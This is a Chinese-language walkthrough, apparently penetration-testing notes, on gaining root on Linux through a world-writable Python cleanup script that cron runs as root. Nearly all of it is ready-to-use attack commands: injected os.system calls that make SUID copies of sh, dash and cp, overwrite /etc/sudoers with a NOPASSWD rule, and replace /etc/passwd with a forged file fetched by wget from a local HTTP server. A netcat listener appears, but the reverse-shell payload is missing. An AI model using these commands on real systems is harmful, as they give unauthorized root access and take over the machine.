#### 枚举所有具有可写权限的二进制文件
- 枚举所有具有可写权限的二进制文件
- 在/lib/log路径下有一个python文件，我们进入到该目录并查看该文件的权限为777
```cmd
find / -writable -type  f 2>/dev/null | grep -v "/proc/"
```
通过cat命令查看该文件内容，这是管理员添加的一个用来清除 /tmp中的所有垃圾文件的脚本，具体执行取决于管理员设置的定时间隔

#### method 1
复制了/bin/sh到/tmp下并为/tmp/sh启用了SUID
```cmd
os.system('cp /bin/sh /tmp/sh')
os.system('chmod u+s /tmp/sh')
```

将在/tmp目录内创建一个具有SUID权限的sh文件
```cmd
cd /tmp
ls
./sh
id
whoami
```

#### method 2
可以将 "rm -r /tmp/*" 替换为
```cmd
os.system(‘chmod u+s /bin/dash)
```
它将为/bin/dash设置SUID权限，并且在运行时会给予root访问权限
```cmd
/bin/dash
id
whoami
```

#### method 3
```cmd
nc -lvp 1234
id
whoami
```

#### method 4
让自己成为suoders文件成员
```cmd
os.system('echo "wernerbrandes ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')
```

```cmd
sudo -l
sudo bash
id
```

#### method 5
```cmd
openssl passwd -1 -salt abc 123
```

```cmd
cd Desktop
python -m SimpleHTTPServer 80
```

```cmd
os.system(‘chmod u+s /bin/cp)
```

```cmd
cd /tmp
wget http://192.168.1.103/passwd
ls -al /bin/cp
cp passwd /etc/passwd
```

```cmd
tail /etc/passwd
```

```cmd
su nemo
password 123
whoami
```
